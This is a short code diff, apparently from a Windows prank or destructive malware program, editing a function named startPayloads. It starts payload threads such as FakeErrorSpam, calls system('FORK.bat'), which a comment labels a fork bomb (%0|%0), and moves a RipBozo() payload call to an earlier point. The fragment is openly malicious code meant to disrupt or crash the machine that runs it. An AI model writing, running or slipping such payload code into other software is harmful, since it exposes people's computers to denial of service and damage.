@@ -2319,12 +2319,13 @@ void startPayloads() {
 
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
     thread = CreateThread(0, 0, FakeErrorSpam, 0, 0, &ID);
+    RipBozo();
     Sleep(random() % 4000 + 3000);
 
     // Here is when stuff gets a lil' bit stronger:
 
     system("FORK.bat"); // (forkbomb, %0|%0)
-    RipBozo();
+    
     
 	//startPayloads();
 }
